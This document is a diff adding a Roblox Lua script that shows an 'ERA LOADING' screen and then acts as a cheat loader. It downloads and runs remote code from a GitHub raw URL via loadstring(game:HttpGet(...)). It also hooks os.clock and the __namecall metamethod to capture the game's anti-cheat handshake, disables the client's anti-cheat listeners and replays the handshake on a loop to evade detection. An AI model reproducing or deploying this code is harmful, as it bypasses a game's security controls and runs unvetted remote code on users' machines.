@@ -1,0 +1,109 @@
+-- Function to create and display a loading screen
+local function ShowLoadingScreen()
+    -- Create a ScreenGui to hold the loading screen elements
+    local loadingScreenGui = Instance.new("ScreenGui")
+    loadingScreenGui.Name = "LoadingScreen"
+    loadingScreenGui.ResetOnSpawn = false
+    loadingScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+    -- Create a frame for the background
+    local background = Instance.new("Frame")
+    background.Name = "Background"
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BackgroundTransparency = 0.5
+    background.Parent = loadingScreenGui
+
+    -- Create a label for the "ERA LOADING" text
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Name = "LoadingText"
+    loadingText.Text = "ERA LOADING"
+    loadingText.Font = Enum.Font.SourceSansBold
+    loadingText.FontSize = Enum.FontSize.Size48
+    loadingText.Position = UDim2.new(0.5, -100, 0.5, -50)
+    loadingText.Size = UDim2.new(0, 200, 0, 100)
+    loadingText.TextColor3 = Color3.new(1, 1, 1)
+    loadingText.Parent = background
+
+    -- Create a Tween for smooth fading
+    local fadeTween = game:GetService("TweenService"):Create(loadingScreenGui.Background, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {BackgroundTransparency = 1})
+    
+    -- Wait for a moment to simulate loading
+    wait(2) -- You can adjust this time as needed
+
+    -- Fade out the loading screen
+    fadeTween:Play()
+    fadeTween.Completed:Wait()
+
+    -- Remove the loading screen elements
+    loadingScreenGui:Destroy()
+
+    -- Load the provided script
+    local Free = "1082193080536547368"
+    if Free then 
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EraHubOtop/ERAHUBONTOP/main/ERA'))()
+    end
+    if not Free then 
+        local player = game.Players.LocalPlayer
+        player:Kick("Join the Discord to get access to the script")
+    end
+    
+    -- Rest of your script goes here
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    local Hooks = {}
+    local HandshakeArgs = nil
+    local Remote = ReplicatedStorage:WaitForChild("Remotes").CharacterSoundEvent
+    local FakeTable = {}
+    
+    local RandomNumber = math.random(1e3, 1e5)
+    
+    Hooks.Clock = hookfunction(os.clock, function(...)
+        return Hooks.Clock(...) + RandomNumber
+    end)
+    
+    Hooks.Namecall = hookmetamethod(game, "__namecall", function(self, ...)
+        local Method = getnamecallmethod()
+        local Args = {...}
+    
+        if not checkcaller() and self == Remote and (Method == "FireServer" or Method == "fireServer") and Args[1] == "AC\226\154\156\239\184\143" then
+            if not HandshakeArgs then
+                if type(Args[2]) == "table" and #Args[2] == 19 then
+                    HandshakeArgs = Args[2]
+                end
+            else
+                return coroutine.yield()
+            end
+        end
+    
+        return Hooks.Namecall(self, ...)
+    end)
+    
+    while not HandshakeArgs do
+        task.wait()
+    end
+    
+    print("Found handshake arguments.")
+    
+    task.wait(3)
+    
+    for i, v in getconnections(Remote.OnClientEvent) do
+        if getinfo(v.Function).source:find("PlayerModule.LocalScript") then
+            v:Disable()
+        end
+    end
+    
+    print("Disabled connections.")
+    
+    task.spawn(function()
+        while task.wait(0.5) do
+            Remote:FireServer("AC\226\154\156\239\184\143", HandshakeArgs, nil)
+        end
+    end)
+    
+    print("Replicated handshake.")
+end
+
+-- Call the function to show the loading screen
+ShowLoadingScreen()
